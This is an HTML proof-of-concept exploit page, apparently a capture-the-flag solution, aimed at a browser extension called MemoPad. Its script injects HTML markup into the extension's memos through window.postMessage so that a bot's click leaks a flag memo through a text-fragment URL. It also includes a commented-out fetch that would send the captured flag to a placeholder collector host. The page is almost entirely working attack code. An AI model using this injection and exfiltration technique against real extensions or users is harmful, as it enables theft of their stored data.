<!DOCTYPE html>
<meta charset="utf-8">
<title>MemoPad Leak PoC</title>
<body style="font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;">
  <h1>MemoPad Leak PoC</h1>
  <p>Status: <span id="status">booting…</span></p>
  <p>If the exploit works, this page will be revisited with a text fragment containing the flag.
     Check the <b>Console</b> for logs (Cmd/Ctrl+Option/Alt+I → Console).</p>
  <hr>
  <details open>
    <summary>Payload being sent</summary>
    <pre id="payloadBox"></pre>
  </details>
  <hr>
  <h2>Captured</h2>
  <pre id="captured">(nothing yet)</pre>
</body>
<script>
(function(){
  const status = document.getElementById('status');
  const captured = document.getElementById('captured');
  const payloadBox = document.getElementById('payloadBox');

  // 1) Save a malicious memo into the extension via window.postMessage
  // This injects a fake .memo-item that points to index=0 (the flag memo the bot saved first)
  // and supplies our own .memo-url link. The <template> keeps our link as the last one.
  const attackerUrl = location.origin + location.pathname; // current page URL
  const payload = '</div></div>' +
                  '<div class="memo-item" data-index="0">' +
                  '<a class="memo-url" href="' + attackerUrl + '">open</a>' +
                  '</div>' +
                  '<template>';

  payloadBox.textContent = payload;
  status.textContent = 'posting payload…';
  try {
    window.postMessage({ type: 'create', payload }, '*');
    console.log('[PoC] Malicious memo posted');
    status.textContent = 'payload posted; waiting for bot to open the popup and click our link…';
  } catch (e) {
    console.error('postMessage error:', e);
    status.textContent = 'postMessage failed: ' + e;
  }

  // 2) When the popup click brings us back with #:~:text=<FLAG>, read and show it
  function checkFragment(){
    const m = location.href.match(/#:~:text=(.*)$/);
    if (!m) return false;
    const flag = decodeURIComponent(m[1] || '');
    console.log('[PoC] Captured text fragment =', flag);
    captured.textContent = flag ? flag : '(empty)';
    status.textContent = 'Got it!';
    // Optional: Send to a collector (uncomment and set your endpoint)
    // fetch('https://your-collector.example.com/capture?flag=' + encodeURIComponent(flag))
    //   .catch(()=>{});
    return true;
  }

  // Check immediately (if you refreshed) and again after a short delay
  if (!checkFragment()) {
    setTimeout(checkFragment, 800);
  }
})();
</script>
